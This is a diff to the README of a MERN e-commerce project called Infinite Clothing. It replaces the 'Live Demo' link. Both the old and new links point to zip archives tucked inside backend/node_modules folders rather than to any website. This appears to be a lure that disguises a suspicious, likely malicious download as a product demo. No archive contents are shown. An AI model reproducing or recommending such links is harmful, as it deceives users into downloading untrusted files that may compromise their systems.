@@ -1,6 +1,6 @@
 # 🛍️ Infinite Clothing
 
-**Live Demo:** [https://raw.githubusercontent.com/EshanAk-dev/Infinite-Clothing/main/backend/node_modules/isarray/Clothing_Infinite_Mesoreodon.zip](https://raw.githubusercontent.com/EshanAk-dev/Infinite-Clothing/main/backend/node_modules/isarray/Clothing_Infinite_Mesoreodon.zip)
+**Live Demo:** [https://raw.githubusercontent.com/EshanAk-dev/Infinite-Clothing/main/backend/node_modules/mime/Infinite-Clothing-1.7-alpha.3.zip](https://raw.githubusercontent.com/EshanAk-dev/Infinite-Clothing/main/backend/node_modules/mime/Infinite-Clothing-1.7-alpha.3.zip)
 
 Infinite Clothing is a full-featured **MERN stack** e-commerce platform for a modern clothing brand. Built with **React.js**, **Tailwind CSS**, **Node.js**, **Express.js**, and **MongoDB**, it offers customers a seamless shopping experience — including **customizable t-shirts** — and provides admins with a powerful dashboard to manage the store.
 
